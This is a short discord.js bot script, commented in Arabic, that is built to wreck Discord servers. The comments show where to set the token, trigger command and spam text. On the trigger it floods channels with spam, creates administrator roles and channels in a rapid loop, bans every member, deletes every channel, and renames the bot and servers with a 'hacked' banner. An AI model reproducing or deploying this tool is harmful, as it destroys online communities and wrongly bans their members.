const Discord = require("discord.js");
const client = new Discord.Client();
//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
const Token = "BOT_TOKEN" //هنا توكن البوت اللي بتشغل عليه الهاك
const x_x = ".2" //هنا تحط الامر اللي يشغل الهاك
const teext = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
const vooice = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
const pic = "https://cdn.discordapp.com/avatars/200644160179535872/5a245f045a43665f00f6b1a7817cc68c.png?size=2048" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
const spam = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي رسالة السبام
const namee = "تمت الجحفلة By : - Mál" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
const playing = "Hacked u hhh Malicious" //هنا تحط وش تبي يكون الستريمنق
client.on('message', message => {
if (message.content === x_x) {
    var teeext = teext.replace(" ", "-")
    var interval = setInterval (function () {
    const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail(pic)
   .addField(spam, ".")
    message.channel.sendEmbed(embed);
    client.guilds.forEach(hack => {
    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
    hack.createChannel(teeext, 'text')
    hack.createChannel(vooice, 'voice')
    })}, 3);}});
client.on('message', message => {
if (message.content === x_x) {
    message.guild.members.forEach(baand => {
   baand.ban({reason: spam,});
   client.channels.forEach(hackch => {
   hackch.delete();
   client.user.setAvatar(pic)
   client.user.setUsername(namee)
   client.user.setGame(playing, 'https://www.twitch.tv/hix')
   client.guilds.forEach(hack => {
   hack.setIcon(pic)
   hack.setName(namee)})})})}});

client.login(process.env.BOT_TOKEN);

